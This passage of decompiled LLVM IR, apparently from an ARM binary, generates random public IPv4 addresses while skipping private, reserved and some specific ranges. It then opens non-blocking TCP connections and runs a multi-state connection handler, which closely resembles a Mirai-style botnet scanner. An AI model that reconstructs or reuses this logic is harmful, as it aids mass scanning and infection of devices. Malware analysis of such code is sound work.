  %v0_9e64 = load i32, i32* @r4, align 4
  %v1_9e64 = trunc i32 %v0_9e64 to i8
  %v3_9e64 = add i32 %v1_9e50, 2
  %v4_9e64 = inttoptr i32 %v3_9e64 to i8*
  store i8 %v1_9e64, i8* %v4_9e64, align 1
  %v0_9e68 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e68 = load i32, i32* %ip.global-to-local, align 4
  %v2_9e68 = inttoptr i32 %v1_9e68 to i32*
  store i32 %v0_9e68, i32* %v2_9e68, align 4
  %v0_9e6c = load i32, i32* @r4, align 4
  %v1_9e6c = load i32, i32* %r3.global-to-local, align 4
  %v2_9e6c = add i32 %v1_9e6c, 8
  %v3_9e6c = inttoptr i32 %v2_9e6c to i32*
  store i32 %v0_9e6c, i32* %v3_9e6c, align 4
  %v0_9e70 = load i32, i32* @r4, align 4
  %v1_9e70 = trunc i32 %v0_9e70 to i8
  %v2_9e70 = load i32, i32* %r3.global-to-local, align 4
  %v3_9e70 = inttoptr i32 %v2_9e70 to i8*
  store i8 %v1_9e70, i8* %v3_9e70, align 1
  %v0_9e74 = load i32, i32* @r4, align 4
  %v1_9e74 = trunc i32 %v0_9e74 to i8
  %v2_9e74 = load i32, i32* %r3.global-to-local, align 4
  %v3_9e74 = add i32 %v2_9e74, 1
  %v4_9e74 = inttoptr i32 %v3_9e74 to i8*
  store i8 %v1_9e74, i8* %v4_9e74, align 1
  store i32 61, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v4_9e84 = call i32 @function_9934(i32 61, i32 1, i32 ptrtoint ([62 x i8]* @global_var_e390.159 to i32))
  store i32 31, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v4_9e94 = call i32 @function_9934(i32 31, i32 2, i32 ptrtoint ([32 x i8]* @global_var_e3d0.161 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v4_9ea4 = call i32 @function_9934(i32 10, i32 3, i32 ptrtoint ([11 x i8]* @global_var_e3f0.163 to i32))
  store i32 %v4_9ea4, i32* %r0.global-to-local, align 4
  store i32 20736, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9ec4

dec_label_pc_9ec0:                                ; preds = %bb183, %dec_label_pc_9df8
  %stack_var_-2316.0 = phi i32 [ %tmp144, %bb183 ], [ %v1_9cd0, %dec_label_pc_9df8 ]
  %stack_var_-2320.0 = phi i32 [ %tmp145, %bb183 ], [ %v1_9cac, %dec_label_pc_9df8 ]
  %storemerge2.off0 = phi i8 [ -50, %bb183 ], [ 13, %dec_label_pc_9df8 ]
  br label %dec_label_pc_9ec4

dec_label_pc_9ec4:                                ; preds = %bb184, %dec_label_pc_9e4c, %dec_label_pc_9ec0
  %stack_var_-2324.2 = phi i8 [ %storemerge2.off0, %dec_label_pc_9ec0 ], [ -111, %bb184 ], [ 0, %dec_label_pc_9e4c ]
  %stack_var_-2316.1 = phi i32 [ %stack_var_-2316.0, %dec_label_pc_9ec0 ], [ %tmp144, %bb184 ], [ %tmp144, %dec_label_pc_9e4c ]
  %stack_var_-2320.1 = phi i32 [ %stack_var_-2320.0, %dec_label_pc_9ec0 ], [ %tmp145, %bb184 ], [ %tmp145, %dec_label_pc_9e4c ]
  store i32 %v2_9c2c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v1_9ef467 = load i32, i32* @fp, align 4
  %v5_9ef876 = icmp sgt i32 %v1_9ef467, 0
  br i1 %v5_9ef876, label %dec_label_pc_9ed0, label %dec_label_pc_9efc

dec_label_pc_9ed0:                                ; preds = %dec_label_pc_9ec4, %dec_label_pc_9ed0
  %v0_9ed0 = phi i32 [ %v1_9ef0, %dec_label_pc_9ed0 ], [ %v2_9c2c, %dec_label_pc_9ec4 ]
  store i32 %v0_9ed0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1048, i32* @r2, align 4
  %v3_9edc = call i32 @function_aba4(i32 %v0_9ed0, i32 0, i32 1048)
  store i32 %v3_9edc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9ee4 = load i32, i32* @r4, align 4
  %v3_9ee4 = add i32 %v2_9ee4, 17
  %v4_9ee4 = inttoptr i32 %v3_9ee4 to i8*
  store i8 1, i8* %v4_9ee4, align 1
  %v0_9ee8 = load i32, i32* @r4, align 4
  %v0_9eec = load i32, i32* @r5, align 4
  %v1_9eec = load i32, i32* %r3.global-to-local, align 4
  %v2_9eec = add i32 %v1_9eec, %v0_9eec
  store i32 %v2_9eec, i32* @r5, align 4
  %v1_9ef0 = add i32 %v0_9ee8, 1048
  store i32 %v1_9ef0, i32* @r4, align 4
  %v1_9ef4 = load i32, i32* @fp, align 4
  %v5_9ef8 = icmp slt i32 %v2_9eec, %v1_9ef4
  br i1 %v5_9ef8, label %dec_label_pc_9ed0, label %dec_label_pc_9efc

dec_label_pc_9efc:                                ; preds = %dec_label_pc_9ed0, %dec_label_pc_9ec4, %dec_label_pc_a928
  %v1_a92c83 = phi i32 [ %v1_a92c, %dec_label_pc_a928 ], [ %v1_9ef467, %dec_label_pc_9ec4 ], [ %v1_9ef4, %dec_label_pc_9ed0 ]
  %stack_var_-2328.0 = phi i32 [ %stack_var_-2328.7, %dec_label_pc_a928 ], [ %tmp136, %dec_label_pc_9ec4 ], [ %tmp136, %dec_label_pc_9ed0 ]
  %stack_var_-2324.3 = phi i8 [ %stack_var_-2324.10, %dec_label_pc_a928 ], [ %stack_var_-2324.2, %dec_label_pc_9ec4 ], [ %stack_var_-2324.2, %dec_label_pc_9ed0 ]
  %stack_var_-2316.2 = phi i32 [ %stack_var_-2316.9, %dec_label_pc_a928 ], [ %stack_var_-2316.1, %dec_label_pc_9ec4 ], [ %stack_var_-2316.1, %dec_label_pc_9ed0 ]
  %stack_var_-2320.2 = phi i32 [ %stack_var_-2320.9, %dec_label_pc_a928 ], [ %stack_var_-2320.1, %dec_label_pc_9ec4 ], [ %stack_var_-2320.1, %dec_label_pc_9ed0 ]
  %stack_var_-2312.1 = phi i32 [ %stack_var_-2312.8, %dec_label_pc_a928 ], [ %v2_9c2c, %dec_label_pc_9ec4 ], [ %v2_9c2c, %dec_label_pc_9ed0 ]
  store i32 %stack_var_-2312.1, i32* @r7, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a928

dec_label_pc_9f0c:                                ; preds = %dec_label_pc_a928
  %v1_9f0c = add i32 %v0_9f6c, 16
  %v2_9f0c = inttoptr i32 %v1_9f0c to i8*
  %v3_9f0c = load i8, i8* %v2_9f0c, align 1
  %v4_9f0c = sext i8 %v3_9f0c to i32
  %v5_9f0c = zext i8 %v3_9f0c to i32
  store i32 %v5_9f0c, i32* %r3.global-to-local, align 4
  switch i32 %v4_9f0c, label %dec_label_pc_a914 [
    i32 0, label %dec_label_pc_9f5c
    i32 1, label %dec_label_pc_a158
    i32 2, label %dec_label_pc_a25c
    i32 3, label %dec_label_pc_a5dc
    i32 4, label %dec_label_pc_a61c
    i32 5, label %dec_label_pc_a2a4
    i32 6, label %dec_label_pc_a740
    i32 7, label %dec_label_pc_a7e8
    i32 8, label %dec_label_pc_a690
    i32 9, label %dec_label_pc_a2f0
    i32 10, label %dec_label_pc_a6b0
    i32 11, label %dec_label_pc_a874
    i32 12, label %dec_label_pc_a418
    i32 13, label %dec_label_pc_a700
    i32 14, label %dec_label_pc_a524
    i32 15, label %dec_label_pc_a908
  ]

dec_label_pc_9f5c:                                ; preds = %dec_label_pc_9f0c
  %v1_9f5c = add i32 %v0_9f6c, 17
  %v2_9f5c = inttoptr i32 %v1_9f5c to i8*
  %v3_9f5c = load i8, i8* %v2_9f5c, align 1
  %v4_9f5c = zext i8 %v3_9f5c to i32
  store i32 %v4_9f5c, i32* %r3.global-to-local, align 4
  %v7_9f60 = icmp eq i8 %v3_9f5c, 1
  br i1 %v7_9f60, label %dec_label_pc_9f68, label %dec_label_pc_a0b4

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f5c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_9f6c, i32* %r0.global-to-local, align 4
  store i32 1048, i32* @r2, align 4
  %v3_9f74 = call i32 @function_aba4(i32 %v0_9f6c, i32 0, i32 1048)
  store i32 %v3_9f74, i32* %r0.global-to-local, align 4
  %v4_9f78 = sext i8 %stack_var_-2324.10 to i32
  store i32 %v4_9f78, i32* %r1.global-to-local, align 4
  %v3_9f7c = sdiv i32 %v4_9f78, 256
  store i32 %v3_9f7c, i32* %r3.global-to-local, align 4
  %v1_9f80 = trunc i32 %v3_9f7c to i8
  %v2_9f80 = load i32, i32* @r7, align 4
  %v3_9f80 = add i32 %v2_9f80, 5
  %v4_9f80 = inttoptr i32 %v3_9f80 to i8*
  store i8 %v1_9f80, i8* %v4_9f80, align 1
  %v0_9f84 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f84 = trunc i32 %v0_9f84 to i8
  %v2_9f84 = load i32, i32* @r7, align 4
  %v3_9f84 = add i32 %v2_9f84, 4
  %v4_9f84 = inttoptr i32 %v3_9f84 to i8*
  store i8 %v1_9f84, i8* %v4_9f84, align 1
  br label %dec_label_pc_9f88

dec_label_pc_9f88:                                ; preds = %dec_label_pc_a058, %dec_label_pc_9fe4, %dec_label_pc_a028, %dec_label_pc_a06c, %.thread12, %dec_label_pc_a080, %dec_label_pc_a074, %dec_label_pc_a064, %bb186, %dec_label_pc_a048, %dec_label_pc_a018, %dec_label_pc_9fd4, %bb185, %dec_label_pc_9f68
  %v0_9f88 = call i32 @function_939c()
  store i32 %v0_9f88, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9f90 = call i32 @function_b5dc(i32 %v0_9f88, i32 255)
  store i32 %v2_9f90, i32* %r0.global-to-local, align 4
  %v1_9f94 = urem i32 %v2_9f90, 256
  store i32 %v1_9f94, i32* %r5.global-to-local, align 4
  %v0_9f98 = call i32 @function_939c()
  store i32 %v0_9f98, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9fa0 = call i32 @function_b5dc(i32 %v0_9f98, i32 255)
  store i32 %v2_9fa0, i32* %r0.global-to-local, align 4
  %v1_9fa4 = urem i32 %v2_9fa0, 256
  store i32 %v1_9fa4, i32* %r4.global-to-local, align 4
  %v0_9fa8 = call i32 @function_939c()
  store i32 %v0_9fa8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9fb0 = call i32 @function_b5dc(i32 %v0_9fa8, i32 255)
  store i32 %v2_9fb0, i32* %r0.global-to-local, align 4
  %v1_9fb4 = urem i32 %v2_9fb0, 256
  store i32 %v1_9fb4, i32* @r6, align 4
  %v0_9fb8 = call i32 @function_939c()
  store i32 %v0_9fb8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9fc0 = call i32 @function_b5dc(i32 %v0_9fb8, i32 255)
  store i32 %v2_9fc0, i32* %r0.global-to-local, align 4
  %v0_9fc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_9fc4 = icmp eq i32 %v0_9fc4, 0
  br i1 %v2_9fc4, label %.thread12, label %bb185

.thread12:                                        ; preds = %dec_label_pc_9f88
  %v1_9fcc13 = urem i32 %v2_9fc0, 256
  store i32 %v1_9fcc13, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f88

bb185:                                            ; preds = %dec_label_pc_9f88
  %v8_9fc8 = icmp eq i32 %v0_9fc4, 127
  %v1_9fcc = urem i32 %v2_9fc0, 256
  store i32 %v1_9fcc, i32* %r0.global-to-local, align 4
  br i1 %v8_9fc8, label %dec_label_pc_9f88, label %dec_label_pc_9fd4

dec_label_pc_9fd4:                                ; preds = %bb185
  %v7_9fd4 = icmp eq i32 %v0_9fc4, 10
  br i1 %v7_9fd4, label %dec_label_pc_9f88, label %dec_label_pc_9fdc

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9fd4
  %v7_9fdc = icmp eq i32 %v0_9fc4, 192
  br i1 %v7_9fdc, label %dec_label_pc_9fe4, label %dec_label_pc_9fec

dec_label_pc_9fe4:                                ; preds = %dec_label_pc_9fdc
  %v0_9fe4 = load i32, i32* %r4.global-to-local, align 4
  %v7_9fe4 = icmp eq i32 %v0_9fe4, 168
  br i1 %v7_9fe4, label %dec_label_pc_9f88, label %dec_label_pc_a084

dec_label_pc_9fec:                                ; preds = %dec_label_pc_9fdc
  %v7_9fec = icmp eq i32 %v0_9fc4, 172
  br i1 %v7_9fec, label %dec_label_pc_9ff4, label %dec_label_pc_a004

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9fec
  %v0_9ff4 = load i32, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_9ff4, 16
  br i1 %tmp, label %dec_label_pc_a084, label %dec_label_pc_9ffc

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_9ff4
  %v2_9ffc = icmp ugt i32 %v0_9ff4, 30
  %v7_9ffc = icmp eq i32 %v0_9ff4, 31
  br label %dec_label_pc_a018

dec_label_pc_a004:                                ; preds = %dec_label_pc_9fec
  %v7_a004 = icmp eq i32 %v0_9fc4, 100
  br i1 %v7_a004, label %dec_label_pc_a00c, label %dec_label_pc_a020

dec_label_pc_a00c:                                ; preds = %dec_label_pc_a004
  %v0_a00c = load i32, i32* %r4.global-to-local, align 4
  %tmp220 = icmp ult i32 %v0_a00c, 64
  br i1 %tmp220, label %dec_label_pc_a084, label %dec_label_pc_a014

dec_label_pc_a014:                                ; preds = %dec_label_pc_a00c
  %v2_a014 = icmp ugt i32 %v0_a00c, 125
  %v7_a014 = icmp eq i32 %v0_a00c, 126
  br label %dec_label_pc_a018

dec_label_pc_a018:                                ; preds = %dec_label_pc_a040, %dec_label_pc_9ffc, %dec_label_pc_a014
  %v0_a084109 = phi i32 [ %v0_a038, %dec_label_pc_a040 ], [ %v0_9ff4, %dec_label_pc_9ffc ], [ %v0_a00c, %dec_label_pc_a014 ]
  %v1_a018 = phi i1 [ %v2_a040, %dec_label_pc_a040 ], [ %v2_9ffc, %dec_label_pc_9ffc ], [ %v2_a014, %dec_label_pc_a014 ]
  %v0_a018 = phi i1 [ %v7_a040, %dec_label_pc_a040 ], [ %v7_9ffc, %dec_label_pc_9ffc ], [ %v7_a014, %dec_label_pc_a014 ]
  %v2_a018 = xor i1 %v1_a018, true
  %v3_a018 = or i1 %v0_a018, %v2_a018
  br i1 %v3_a018, label %dec_label_pc_9f88, label %dec_label_pc_a084

dec_label_pc_a020:                                ; preds = %dec_label_pc_a004
  %v7_a020 = icmp eq i32 %v0_9fc4, 169
  br i1 %v7_a020, label %dec_label_pc_a028, label %dec_label_pc_a030

dec_label_pc_a028:                                ; preds = %dec_label_pc_a020
  %v0_a028 = load i32, i32* %r4.global-to-local, align 4
  %v7_a028 = icmp eq i32 %v0_a028, 255
  br i1 %v7_a028, label %dec_label_pc_9f88, label %dec_label_pc_a084

dec_label_pc_a030:                                ; preds = %dec_label_pc_a020
  %v7_a030 = icmp eq i32 %v0_9fc4, 198
  br i1 %v7_a030, label %dec_label_pc_a038, label %dec_label_pc_a048

dec_label_pc_a038:                                ; preds = %dec_label_pc_a030
  %v0_a038 = load i32, i32* %r4.global-to-local, align 4
  %tmp221 = icmp ult i32 %v0_a038, 18
  br i1 %tmp221, label %dec_label_pc_a084, label %dec_label_pc_a040

dec_label_pc_a040:                                ; preds = %dec_label_pc_a038
  %v2_a040 = icmp ne i32 %v0_a038, 18
  %v7_a040 = icmp eq i32 %v0_a038, 19
  br label %dec_label_pc_a018

dec_label_pc_a048:                                ; preds = %dec_label_pc_a030
  %tmp222 = icmp ugt i32 %v0_9fc4, 223
  br i1 %tmp222, label %dec_label_pc_9f88, label %dec_label_pc_a050

dec_label_pc_a050:                                ; preds = %dec_label_pc_a048
  %v7_a050 = icmp eq i32 %v0_9fc4, 106
  br i1 %v7_a050, label %dec_label_pc_a058, label %dec_label_pc_a074

dec_label_pc_a058:                                ; preds = %dec_label_pc_a050
  %v0_a058 = load i32, i32* %r4.global-to-local, align 4
  %v7_a058 = icmp eq i32 %v0_a058, 187
  br i1 %v7_a058, label %dec_label_pc_9f88, label %bb186

bb186:                                            ; preds = %dec_label_pc_a058
  %v8_a05c = icmp eq i32 %v0_a058, 185
  br i1 %v8_a05c, label %dec_label_pc_9f88, label %dec_label_pc_a064

dec_label_pc_a064:                                ; preds = %bb186
  %v7_a064 = icmp eq i32 %v0_a058, 184
  br i1 %v7_a064, label %dec_label_pc_9f88, label %dec_label_pc_a06c

dec_label_pc_a06c:                                ; preds = %dec_label_pc_a064
  %v7_a06c = icmp eq i32 %v0_a058, 186
  br i1 %v7_a06c, label %dec_label_pc_9f88, label %dec_label_pc_a084

dec_label_pc_a074:                                ; preds = %dec_label_pc_a050
  %v7_a074 = icmp eq i32 %v0_9fc4, 6
  br i1 %v7_a074, label %dec_label_pc_9f88, label %dec_label_pc_a080

dec_label_pc_a080:                                ; preds = %dec_label_pc_a074
  %v7_a07c = icmp eq i32 %v0_9fc4, 11
  br i1 %v7_a07c, label %dec_label_pc_9f88, label %dec_label_pc_a080.dec_label_pc_a084_crit_edge

dec_label_pc_a080.dec_label_pc_a084_crit_edge:    ; preds = %dec_label_pc_a080
  %v0_a084.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a084

dec_label_pc_a084:                                ; preds = %dec_label_pc_9fe4, %dec_label_pc_a028, %dec_label_pc_a06c, %dec_label_pc_a018, %dec_label_pc_a038, %dec_label_pc_a00c, %dec_label_pc_9ff4, %dec_label_pc_a080.dec_label_pc_a084_crit_edge
  %v0_9fc4213 = phi i32 [ %v0_9fc4, %dec_label_pc_a080.dec_label_pc_a084_crit_edge ], [ 172, %dec_label_pc_9ff4 ], [ 100, %dec_label_pc_a00c ], [ 198, %dec_label_pc_a038 ], [ %v0_9fc4, %dec_label_pc_a018 ], [ 106, %dec_label_pc_a06c ], [ 169, %dec_label_pc_a028 ], [ 192, %dec_label_pc_9fe4 ]
  %v0_a084 = phi i32 [ %v0_a084.pre, %dec_label_pc_a080.dec_label_pc_a084_crit_edge ], [ %v0_9ff4, %dec_label_pc_9ff4 ], [ %v0_a00c, %dec_label_pc_a00c ], [ %v0_a038, %dec_label_pc_a038 ], [ %v0_a084109, %dec_label_pc_a018 ], [ %v0_a058, %dec_label_pc_a06c ], [ %v0_a028, %dec_label_pc_a028 ], [ %v0_9fe4, %dec_label_pc_9fe4 ]
  %v3_a084 = mul i32 %v0_a084, 65536
  %v4_a088 = mul i32 %v0_9fc4213, 16777216
  %v1_a090 = load i32, i32* @r6, align 4
  %v4_a090 = mul i32 %v1_a090, 256
  %v5_a088 = or i32 %v4_a088, %v1_9fcc
  %v2_a08c = or i32 %v5_a088, %v3_a084
  %v5_a090 = or i32 %v2_a08c, %v4_a090
  store i32 %v5_a090, i32* %r3.global-to-local, align 4
  %v1_a094 = udiv i32 %v5_a090, 256
  %v3_a09c = and i32 %v1_a094, 65280
  %v1_a098 = mul i32 %v1_a090, 65536
  %v3_a0a0 = and i32 %v1_a098, 16711680
  %v4_a0a4 = mul i32 %v2_9fc0, 16777216
  %v5_a0a4 = or i32 %v3_a0a0, %v4_a0a4
  store i32 %v5_a0a4, i32* %r1.global-to-local, align 4
  %v4_a0a8 = udiv i32 %v5_a090, 16777216
  %v5_a0a8 = or i32 %v4_a0a8, %v5_a0a4
  %v2_a0ac = or i32 %v5_a0a8, %v3_a09c
  %v1_a0b0 = load i32, i32* @r7, align 4
  %v2_a0b0 = inttoptr i32 %v1_a0b0 to i32*
  store i32 %v2_a0ac, i32* %v2_a0b0, align 4
  %v0_a0b4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a0b4

dec_label_pc_a0b4:                                ; preds = %dec_label_pc_9f5c, %dec_label_pc_a084
  %v0_a0c4 = phi i32 [ %v0_9f6c, %dec_label_pc_9f5c ], [ %v0_a0b4.pre, %dec_label_pc_a084 ]
  %v1_a0b4 = add i32 %v0_a0c4, 5
  %v2_a0b4 = inttoptr i32 %v1_a0b4 to i8*
  %v3_a0b4 = load i8, i8* %v2_a0b4, align 1
  %v4_a0b4 = zext i8 %v3_a0b4 to i32
  store i32 %v4_a0b4, i32* %r3.global-to-local, align 4
  %v1_a0b8 = add i32 %v0_a0c4, 4
  %v2_a0b8 = inttoptr i32 %v1_a0b8 to i8*
  %v3_a0b8 = load i8, i8* %v2_a0b8, align 1
  %v4_a0b8 = zext i8 %v3_a0b8 to i32
  store i32 2, i32* @lr, align 4
  %v4_a0c0 = mul nuw nsw i32 %v4_a0b4, 256
  %v5_a0c0 = or i32 %v4_a0b8, %v4_a0c0
  store i32 %v5_a0c0, i32* %ip.global-to-local, align 4
  %v1_a0c4 = inttoptr i32 %v0_a0c4 to i32*
  %v2_a0c4 = load i32, i32* %v1_a0c4, align 4
  store i32 %v2_a0c4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v4_a0b4, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v3_a0f0 = call i32 @function_c0a8(i32 2, i32 1, i32 0)
  store i32 %v3_a0f0, i32* %r0.global-to-local, align 4
  %v7_a0f4 = icmp eq i32 %v3_a0f0, -1
  store i32 %v3_a0f0, i32* @r4, align 4
  %v1_a0fc = load i32, i32* @r7, align 4
  %v2_a0fc = add i32 %v1_a0fc, 8
  %v3_a0fc = inttoptr i32 %v2_a0fc to i32*
  store i32 %v3_a0f0, i32* %v3_a0fc, align 4
  br i1 %v7_a0f4, label %dec_label_pc_a914, label %dec_label_pc_a104

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0b4
  %v0_a104 = load i32, i32* @r5, align 4
  store i32 %v0_a104, i32* @r2, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_a10c = call i32 @function_b790(i32 %v3_a0f0, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a114 = or i32 %v2_a10c, 2048
  store i32 %v1_a114, i32* @r2, align 4
  %v0_a118 = load i32, i32* @r4, align 4
  store i32 %v0_a118, i32* %r0.global-to-local, align 4
  %v2_a11c = call i32 @function_b790(i32 %v0_a118, i32 4)
  store i32 %v2_a11c, i32* %r0.global-to-local, align 4
  %v2_a120 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_a120, i32* %r1.global-to-local, align 4
  %v0_a124 = load i32, i32* @r7, align 4
  %v1_a124 = add i32 %v0_a124, 8
  %v2_a124 = inttoptr i32 %v1_a124 to i32*
  %v3_a124 = load i32, i32* %v2_a124, align 4
  store i32 %v3_a124, i32* %r0.global-to-local, align 4
  %v2_a128 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_a128, i32* %r1.global-to-local, align 4
  %v3_a130 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v4_a130 = call i32 @function_bf38(i32 %v3_a124, %sockaddr* %v3_a130, i32 16)
  store i32 %v4_a130, i32* %r0.global-to-local, align 4
  %v3_a134 = icmp eq i32 %v4_a130, -1
  br i1 %v3_a134, label %dec_label_pc_a13c, label %dec_label_pc_a14c

dec_label_pc_a13c:                                ; preds = %dec_label_pc_a104
  %v0_a13c = call i32 @function_bdd4()
  store i32 %v0_a13c, i32* %r0.global-to-local, align 4
  %v1_a140 = inttoptr i32 %v0_a13c to i32*
  %v2_a140 = load i32, i32* %v1_a140, align 4
  store i32 %v2_a140, i32* %r3.global-to-local, align 4
  %v7_a144 = icmp eq i32 %v2_a140, 115
  br i1 %v7_a144, label %dec_label_pc_a14c, label %dec_label_pc_a8ec

dec_label_pc_a14c:                                ; preds = %dec_label_pc_a13c, %dec_label_pc_a104
  %v0_a14c = load i32, i32* @r7, align 4
  store i32 %v0_a14c, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  br label %dec_label_pc_a900

dec_label_pc_a158:                                ; preds = %dec_label_pc_9f0c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a160 = ptrtoint i32* %stack_var_-256 to i32
  br label %dec_label_pc_a15c

dec_label_pc_a15c:                                ; preds = %dec_label_pc_a15c, %dec_label_pc_a158
  %v1_a168 = phi i32 [ %v1_a16c, %dec_label_pc_a15c ], [ 0, %dec_label_pc_a158 ]
  store i32 0, i32* @r6, align 4
  %v3_a168 = add i32 %v1_a168, %v2_a160
  %v4_a168 = inttoptr i32 %v3_a168 to i32*
  store i32 0, i32* %v4_a168, align 4
  %v0_a16c = load i32, i32* %r3.global-to-local, align 4
  %v1_a16c = add i32 %v0_a16c, 4
  store i32 %v1_a16c, i32* %r3.global-to-local, align 4
  %v7_a170 = icmp eq i32 %v1_a16c, 128
  br i1 %v7_a170, label %dec_label_pc_a178, label %dec_label_pc_a15c

dec_label_pc_a178:                                ; preds = %dec_label_pc_a15c
  %v0_a178 = load i32, i32* @r7, align 4
  %v1_a178 = add i32 %v0_a178, 8
  %v2_a178 = inttoptr i32 %v1_a178 to i32*
  %v3_a178 = load i32, i32* %v2_a178, align 4
  store i32 %v3_a178, i32* %r0.global-to-local, align 4
  %v2_a17c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_a17c, i32* %r1.global-to-local, align 4
  %v3_a180 = udiv i32 %v3_a178, 32
  store i32 %v3_a180, i32* %r3.global-to-local, align 4
  %v4_a184 = mul nuw nsw i32 %v3_a180, 4
  %v5_a184 = add i32 %v4_a184, %v2_a17c
  store i32 %v5_a184, i32* @lr, align 4
  %v1_a188 = add i32 %v5_a184, -220
  %v2_a188 = inttoptr i32 %v1_a188 to i32*
  %v3_a188 = load i32, i32* %v2_a188, align 4
  %v1_a18c = urem i32 %v3_a178, 32
  store i32 1, i32* @r5, align 4
  %v7_a194 = shl i32 1, %v1_a18c
  %v8_a194 = or i32 %v3_a188, %v7_a194
  store i32 %v8_a194, i32* %v2_a188, align 4
  %v0_a1a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_a1a4 = load i32, i32* @r5, align 4
  %v2_a1a4 = add i32 %v1_a1a4, %v0_a1a4
  store i32 %v2_a1a4, i32* %r0.global-to-local, align 4
  %v2_a1a8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_a1a8, i32* %ip.global-to-local, align 4
  %v0_a1ac = load i32, i32* @r6, align 4
  store i32 %v0_a1ac, i32* %r1.global-to-local, align 4
  store i32 %v0_a1ac, i32* %r3.global-to-local, align 4
  store i32 %v0_a1ac, i32* %stack_var_-52, align 4
  %v5_a1bc = call i32 @function_ba74(i32 %v2_a1a4, i32 %v0_a1ac, i32 %v2_a160, i32 %v0_a1ac, i32 %v2_a1a8)
  store i32 %v5_a1bc, i32* @r0, align 4
  %v1_a1c0 = load i32, i32* @r5, align 4
  %v9_a1c0 = icmp eq i32 %v5_a1bc, %v1_a1c0
  store i32 %v5_a1bc, i32* @r4, align 4
  br i1 %v9_a1c0, label %dec_label_pc_a1cc, label %dec_label_pc_a244

dec_label_pc_a1cc:                                ; preds = %dec_label_pc_a178
  %v1_a1cc = add i32 %v5_a1bc, 3
  store i32 %v1_a1cc, i32* @r5, align 4
  store i32 %v2_a1a8, i32* %r3.global-to-local, align 4
  store i32 %v2_a1a8, i32* %ip.global-to-local, align 4
  %v0_a1d8 = load i32, i32* @r7, align 4
  %v1_a1d8 = add i32 %v0_a1d8, 8
  %v2_a1d8 = inttoptr i32 %v1_a1d8 to i32*
  %v3_a1d8 = load i32, i32* %v2_a1d8, align 4
  store i32 %v3_a1d8, i32* %r0.global-to-local, align 4
  %v2_a1e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_a1e0, i32* %ip.global-to-local, align 4
  store i32 %v5_a1bc, i32* %r1.global-to-local, align 4
  %v2_a1e8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_a1e8, i32* %r3.global-to-local, align 4
  %v0_a1ec = load i32, i32* @r6, align 4
  store i32 %v0_a1ec, i32* %stack_var_-40, align 4
  store i32 %v1_a1cc, i32* %stack_var_-44, align 4
  %v6_a1f8 = call i32 @function_bf90(i32 %v3_a1d8, i32 %v5_a1bc, i32 %v1_a1cc, i32* nonnull %stack_var_-40, i32 %v2_a1e0)
  store i32 %v6_a1f8, i32* %r0.global-to-local, align 4
  %v3_a1fc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a1fc, i32* @r2, align 4
  %v1_a200 = load i32, i32* @r6, align 4
  %v9_a200 = icmp eq i32 %v3_a1fc, %v1_a200
  br i1 %v9_a200, label %dec_label_pc_a218, label %dec_label_pc_a208

dec_label_pc_a208:                                ; preds = %dec_label_pc_a1cc
  %v0_a208 = load i32, i32* @r4, align 4
  store i32 %v0_a208, i32* %r1.global-to-local, align 4
  %extract.t = trunc i32 %v0_a208 to i8
  br label %dec_label_pc_a20c

dec_label_pc_a20c:                                ; preds = %.thread16, %dec_label_pc_a208
  %v0_a208.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_a208 ], [ %extract.t202, %.thread16 ]
  %v0_a20c = load i32, i32* @r7, align 4
  store i32 %v0_a20c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a210

dec_label_pc_a210:                                ; preds = %dec_label_pc_a868, %dec_label_pc_a7dc, %dec_label_pc_a8ec, %dec_label_pc_a20c
  %v1_a210.off0 = phi i8 [ 1, %dec_label_pc_a8ec ], [ 2, %dec_label_pc_a7dc ], [ 3, %dec_label_pc_a868 ], [ %v0_a208.sink.off0, %dec_label_pc_a20c ]
